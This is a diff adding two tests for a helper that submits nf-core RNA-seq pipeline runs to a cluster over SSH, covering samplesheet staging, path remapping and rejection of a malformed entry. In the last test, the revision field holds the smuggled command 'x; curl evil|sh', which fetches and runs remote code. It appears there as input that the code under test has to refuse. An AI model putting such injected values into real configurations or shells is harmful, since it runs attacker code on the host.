@@ -107,3 +107,44 @@ def test_submit_luria_one_bad_entry_does_not_abort_siblings(tmp_path, monkeypatc
     runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE)
     assert len(runs) == 1
     assert runs[0]["run_name"] == "good"
+
+
+def test_submit_luria_uses_state_samplesheet_and_remaps_tower_params(tmp_path, monkeypatch):
+    import yaml as _y
+    real_sheet = tmp_path / "samplesheet.csv"
+    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
+    # Tower-shaped params: input/outdir point at a bucket path that does NOT exist locally.
+    (tmp_path / "params.yml").write_text(_y.safe_dump({
+        "input": "/orcd/bucket/inputs/nope.csv", "outdir": "/orcd/bucket/results/x"}))
+    (tmp_path / "launch.yml").write_text(_y.safe_dump({"launch": [{
+        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.21.0",
+        "params-file": "./params.yml"}]}))
+    staged = {}
+    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
+    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 7\n")
+
+    def fake_scp(le, local, remote, *, key_path):
+        if remote.endswith("/samplesheet.csv"):
+            staged["sheet_src"] = str(local)
+        if remote.endswith("/params.yml"):
+            staged["params"] = _y.safe_load(Path(local).read_text())
+
+    monkeypatch.setattr(sub, "scp_file", fake_scp)
+    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
+    assert len(runs) == 1
+    assert staged["sheet_src"] == str(real_sheet)  # staged the REAL local CSV, not the bucket path
+    assert staged["params"]["input"].startswith("/net/x/runs/") and staged["params"]["input"].endswith("/samplesheet.csv")
+    assert staged["params"]["outdir"].startswith("/net/x/results/")  # remapped off /orcd
+
+
+def test_submit_luria_skips_entry_with_injected_revision(tmp_path, monkeypatch):
+    import yaml as _y
+    real_sheet = tmp_path / "samplesheet.csv"
+    real_sheet.write_text("sample\nA\n")
+    (tmp_path / "params.yml").write_text(_y.safe_dump({"input": str(real_sheet)}))
+    (tmp_path / "launch.yml").write_text(_y.safe_dump({"launch": [{
+        "name": "evil", "pipeline": "nf-core/rnaseq", "revision": "x; curl evil|sh",
+        "params-file": "./params.yml"}]}))
+    _patch_transport(monkeypatch)
+    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
+    assert runs == []  # injected revision -> render raises -> entry skipped, never launched
